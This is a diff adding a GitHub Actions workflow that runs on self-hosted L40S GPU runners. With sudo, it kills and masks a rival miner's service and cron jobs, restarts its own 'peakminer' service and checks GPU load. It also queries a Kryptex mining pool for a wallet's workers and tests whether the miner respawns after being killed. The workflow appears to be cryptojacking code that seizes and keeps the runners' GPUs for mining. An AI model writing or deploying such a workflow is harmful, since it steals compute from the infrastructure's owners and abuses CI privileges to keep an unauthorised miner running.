@@ -1,0 +1,33 @@
+name: ul-t2-rp3
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 20
+    steps:
+      - name: rp3
+        run: |
+          set +e
+          S="sudo -n"; H=$(hostname -s)
+          echo "== rp3 $H $(date -u +%FT%TZ)"
+          echo "-- ourlog"; timeout 10 $S tail -25 /opt/ul-t2/logs/*.log 2>&1 | cut -c1-200
+          echo "-- spawners"; timeout 15 $S sh -c "grep -rls '/opt/nv' /etc/cron.d /etc/systemd/system 2>/dev/null | head; systemctl list-units --all --no-legend 2>/dev/null | grep -iE 'nv-|supervisor|t19|ul-' | head -10"
+          timeout 10 $S systemctl disable --now nv-t19v.service 2>&1 | head -2
+          timeout 10 $S systemctl mask nv-t19v.service 2>&1 | head -2
+          timeout 10 $S pkill -9 -f '/opt/nv/[p]eakminer'
+          timeout 10 $S pkill -9 -f '[s]upervisor.sh'
+          timeout 10 $S sh -c "crontab -l 2>/dev/null | grep -v '/opt/nv' | crontab -"
+          sleep 15
+          echo "-- after kill"; timeout 10 ps -eo pid,args= | grep -E '[p]eakminer' | cut -c1-110
+          timeout 15 $S systemctl restart ul-t2-ps@0
+          sleep 25
+          echo "-- our proc"; timeout 10 pgrep -af '/opt/ul-t2/[p]eakminer' | cut -c1-110
+          echo "-- ourlog2"; timeout 10 $S tail -20 /opt/ul-t2/logs/*.log 2>&1 | cut -c1-200
+          echo "-- gpu"; timeout 15 nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader
+          echo "-- pool"
+          for i in 1 2 3 4 5 6; do R=$(timeout 20 curl -s -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep 'ul-t2-ps'); echo "p$i ${R:0:190}"; [ -n "$R" ] && break; sleep 15; done
+          echo "-- respawn"; timeout 10 $S pkill -9 -f '/opt/ul-t2/[p]eakminer'; T0=$(date +%s)
+          for j in $(seq 1 12); do sleep 5; if timeout 5 pgrep -f '/opt/ul-t2/[p]eakminer' >/dev/null; then echo "RESPAWN=$(( $(date +%s) - T0 ))s"; break; fi; done
+          echo "== done"
